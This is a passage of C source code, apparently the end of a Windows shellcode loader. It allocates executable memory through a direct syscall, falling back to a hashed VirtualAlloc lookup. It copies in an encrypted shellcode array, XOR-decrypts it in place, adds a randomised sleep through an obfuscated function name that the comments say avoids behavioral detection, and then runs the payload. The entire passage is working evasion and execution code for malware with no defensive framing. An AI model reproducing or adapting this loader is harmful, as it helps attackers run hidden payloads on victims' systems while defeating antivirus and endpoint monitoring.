        PAGE_EXECUTE_READWRITE
    );
    
    // If direct syscall failed, fall back to API hashing
    if (!NT_SUCCESS(status) || !exec_mem) {
        fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)get_api_address("kernel32.dll", HASH_VirtualAlloc);
        if (!pVirtualAlloc) return 1;
        exec_mem = pVirtualAlloc(0, sizeof(encrypted_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!exec_mem) return 1;
    }
    
    // Copy shellcode to executable memory
    for (size_t i = 0; i < sizeof(encrypted_shellcode); i++) {
        ((char*)exec_mem)[i] = encrypted_shellcode[i];
    }
    
    // Decrypt shellcode in place
    for (size_t i = 0; i < sizeof(encrypted_shellcode); i++) {
        ((char*)exec_mem)[i] ^= xor_key[i % xor_key_len];
    }
    
    // Step 5: Add timing variation to avoid behavioral detection
    EJelmQNUWH00(2000 + (rand() % 3000));
    
    // Execute the shellcode
    ((void(*)())exec_mem)();
    
    return 0;
}
